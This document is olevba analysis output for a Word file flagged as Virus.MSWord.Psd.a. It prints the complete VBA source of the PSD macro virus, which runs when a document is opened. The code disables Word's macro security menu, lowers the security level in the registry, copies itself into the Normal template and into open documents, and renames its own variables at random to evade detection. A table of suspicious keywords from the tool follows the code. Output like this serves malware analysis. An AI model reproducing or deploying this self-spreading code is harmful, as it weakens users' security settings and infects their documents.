olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.a-26282d4c83884655c3f816dec9c0bc24d99ffcd4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.a-26282d4c83884655c3f816dec9c0bc24d99ffcd4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Psd.a-26282d4c83884655c3f816dec9c0bc24d99ffcd4 - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
' W97M/PSD by ALT-F11, VAMP Poly by VicodinES
' Converted to W2000/PSD by VicodinES
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
If Day(Now) = Minute(Now) Then
Randomize: For KO3978 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next KO3978: End If
NC2727 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
IN3627 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set MD1340 = ActiveDocument.VBProject.VBComponents.Item(1)
SC6182 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set MD1340 = NormalTemplate.VBProject.VBComponents.Item(1)
OQ186 = True
Call PG788_BL2915
ActiveDocument.Saved = True
End If
If OQ186 <> True And SC6182 <> True Then GoTo KV4745
If OQ186 = True Then MD1340.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NC2727 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If SC6182 = True Then MD1340.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, IN3627 - 4))
KV4745:
If IN3627 <> 0 And NC2727 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function PG788_BL2915()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "LD4357": r1(2) = "TM8946": r1(3) = "OF99": r1(4) = "GC6254": r1(5) = "BL2915": r1(6) = "NC2727"
r1(7) = "IN3627": r1(8) = "SC6182":: r1(9) = "MD1340": r1(10) = "OQ186": r1(11) = "KV4745": r1(12) = "PG788": r1(13) = "IR7681": r1(14) = "KA065": r1(15) = "KO3978"
For KO3978 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call BL2915(a1, r1(KO3978))
Next KO3978
End Function
Private Function BL2915(KA065, IR7681 As String)
On Error Resume Next
Dim LD4357 As Long: Dim TM8946 As Long: Dim OF99 As Long: Dim GC6254 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
LD4357 = 1: TM8946 = 1: OF99 = .CountOfLines: GC6254 = Len(.Lines(.CountOfLines, 1))
Do While .Find(IR7681, LD4357, TM8946, OF99, GC6254, True)
strline = .Lines(LD4357, 1)
strline = Left(strline, TM8946 - 1) & KA065 & Mid(strline, GC6254)
.replaceline LD4357, strline
LD4357 = OF99 + 1: TM8946 = 1:
OF99 = .CountOfLines
GC6254 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |8_}                 |OF99                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

